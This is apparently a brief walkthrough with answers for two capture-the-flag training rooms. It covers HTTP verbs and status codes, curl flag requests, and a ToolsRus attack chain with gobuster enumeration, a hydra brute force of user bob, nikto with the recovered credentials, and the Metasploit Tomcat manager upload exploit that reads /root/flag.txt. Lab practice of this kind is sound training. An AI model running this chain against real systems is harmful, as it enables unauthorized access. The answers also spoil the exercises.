# Web Fundamentals

## Web Fundamentals

### Task 3 More HTTP - Verbs and request formats

1. Verb used for login?
```
POST
```
2. Verb used to see bank balance once logged in?
```
GET
```
3. Does body of GET request matter?
```
nay
```
4. Status code for "I'm a teapot"?
```
418
```
5. Status code when unauthenticated?
```
401
```

### Task 5 Mini CTF

1. GET flag
```
curl http://IP:8081/ctf/get
```
2. POST flag
```
curl -X POST -d flag_please http://IP:8081/ctf/post
```
3. Get cookie flag
```
Inspect element for /ctf/getcookie, then under "storage"
```
4. Set cookie flag
```
curl -b "flagpls=flagpls" http://IP:8081/ctf/sendcookie
```

## ToolsRus

### Task 1 ToysRus

To find directories
```
gobuster dir -u http://IP:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

To find Bob's password
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.219.157 http-get /protected
```

Using Nikto with creds
```
nikto -id bob:bubbles -h http://10.10.219.157:1234/manager/html
```

use metasploit to exploit
```
use exploit/multi/http/tomcat_mgr_upload
```

Once meterpreter has spawned
```
getuid
```
```
cat /root/flag.txt
```